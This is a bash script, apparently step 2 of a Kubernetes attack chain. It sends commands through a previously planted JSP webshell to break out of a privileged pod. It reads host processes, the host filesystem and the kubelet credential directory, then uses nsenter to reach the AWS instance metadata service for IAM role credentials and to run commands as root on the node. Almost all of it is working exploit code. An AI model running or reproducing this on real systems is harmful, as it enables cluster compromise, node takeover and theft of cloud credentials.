#!/bin/bash
###############################################
# STEP 2: Container Escape
# The pod runs as privileged with hostPID and
# hostPath mount. We can escape the container
# and access the underlying node.
###############################################

set -e

[ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1

# Read webshell info from step 1
SHELL_FILE="/tmp/.k8s-escape-shell"
if [ -f "$SHELL_FILE" ]; then
    SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
    SHELL_HOST=$(sed -n '2p' "$SHELL_FILE")
    # Use saved HOST if current HOST matches, otherwise use current HOST
    SHELL_URL="http://${HOST}/${SHELL_NAME}.jsp"
else
    echo "ERROR: Run step 1 first (./01-exploit-rce.sh)"
    exit 1
fi

remote_exec() {
    curl -s --data-urlencode "cmd=$1" "$SHELL_URL" \
        | tr -d '\0' \
        | sed '/^\s*$/d' \
        | grep -v 'java\.io\.InputStream' \
        | grep -v '^//\s*$' \
        | grep -v '^- $'
}

echo ""
echo "================================================"
echo "  STEP 2: Container Escape"
echo "================================================"
echo "  Webshell: ${SHELL_NAME}.jsp"
echo ""

# ── 2.1 Verify container ────────────────────
echo "> 2.1 - Verify we are inside a container"
CGROUP=$(remote_exec "cat /proc/1/cgroup 2>/dev/null | head -5")
if echo "$CGROUP" | grep -q "kubepods\|docker\|containerd"; then
    echo "  [OK] Confirmed: running inside a container"
    echo "$CGROUP" | head -3 | sed 's/^/    /'
else
    echo "  cgroup output:"
    echo "$CGROUP" | head -3 | sed 's/^/    /'
fi
echo ""

# ── 2.2 Check privileged mode ───────────────
echo "> 2.2 - Check privileged mode (hostPID)"
HOST_PROCS=$(remote_exec "ls /host/proc 2>/dev/null | grep '^[0-9]' | head -10")
if [ -n "$HOST_PROCS" ]; then
    PROC_COUNT=$(echo "$HOST_PROCS" | wc -l | tr -d ' ')
    echo "  [OK] Host processes visible via /host/proc (${PROC_COUNT}+ PIDs found)"
    echo "  Host init process (PID 1):"
    CMDLINE=$(remote_exec "cat /host/proc/1/cmdline" | tr '\0' ' ')
    echo "    $CMDLINE"
else
    echo "  [FAIL] Cannot access /host/proc"
fi
echo ""

# ── 2.3 Access host filesystem ──────────────
echo "> 2.3 - Access host filesystem via hostPath mount (/host)"
HOSTNAME_VAL=$(remote_exec "cat /host/etc/hostname")
if [ -n "$HOSTNAME_VAL" ]; then
    echo "  [OK] Host filesystem accessible"
    echo "  Hostname:   $HOSTNAME_VAL"
else
    echo "  [FAIL] Cannot read /host/etc/hostname"
fi

OS_NAME=$(remote_exec "cat /host/etc/os-release" | grep "^PRETTY_NAME=" | cut -d= -f2 | tr -d '"')
if [ -n "$OS_NAME" ]; then
    echo "  OS:         $OS_NAME"
fi
echo ""

# ── 2.4 Read kubelet credentials ────────────
echo "> 2.4 - Read kubelet credentials from host"
KUBELET_FILES=$(remote_exec "ls /host/var/lib/kubelet/ 2>/dev/null")
if [ -n "$KUBELET_FILES" ]; then
    echo "  [OK] Kubelet directory readable"
    echo "  Contents of /host/var/lib/kubelet/:"
    echo "$KUBELET_FILES" | grep -v '^/host' | sed 's/^/    /'
else
    echo "  [FAIL] Cannot access kubelet directory"
fi
echo ""

# ── 2.5 AWS IMDS ────────────────────────────
echo "> 2.5 - Access AWS Instance Metadata (IMDS)"
echo "  Using nsenter to reach IMDS from host network namespace..."

# Try IMDSv2 first (token-based)
IMDS_TOKEN=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token 2>/dev/null")

if [ -n "$IMDS_TOKEN" ] && [ ${#IMDS_TOKEN} -gt 10 ]; then
    echo "  IMDSv2 token acquired"
    INSTANCE_ID=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -H 'X-aws-ec2-metadata-token: ${IMDS_TOKEN}' http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null")
    IAM_ROLE=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -H 'X-aws-ec2-metadata-token: ${IMDS_TOKEN}' http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null")
else
    # Fallback to IMDSv1
    INSTANCE_ID=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null")
    IAM_ROLE=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null")
fi

if [ -n "$INSTANCE_ID" ]; then
    echo "  [OK] IMDS accessible"
    echo "  Instance ID: $INSTANCE_ID"
    echo "  IAM Role:    $IAM_ROLE"
else
    echo "  [--] IMDS not reachable (IMDSv2 hop limit may block containers)"
fi
echo ""

# ── 2.6 Escape via nsenter ──────────────────
echo "> 2.6 - Full escape via nsenter (PID 1 = host init)"
HOST_HOSTNAME=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- hostname")
HOST_ID=$(remote_exec "nsenter --target 1 --mount --uts --ipc --net --pid -- id")

if [ -n "$HOST_HOSTNAME" ]; then
    echo "  [OK] Code execution on the host node!"
    echo "  hostname => $HOST_HOSTNAME"
    echo "  id       => $HOST_ID"
else
    echo "  [FAIL] nsenter failed"
fi
echo ""

# ── Summary ─────────────────────────────────
echo "================================================"
echo "  [OK] Container escape successful!"
echo "------------------------------------------------"
echo "  Escape vectors used:"
echo "    * hostPID    -> access host process tree"
echo "    * hostPath / -> read/write host filesystem"
echo "    * privileged -> nsenter to host namespaces"
echo "    * nsenter    -> run commands as root on node"
echo "================================================"
echo ""
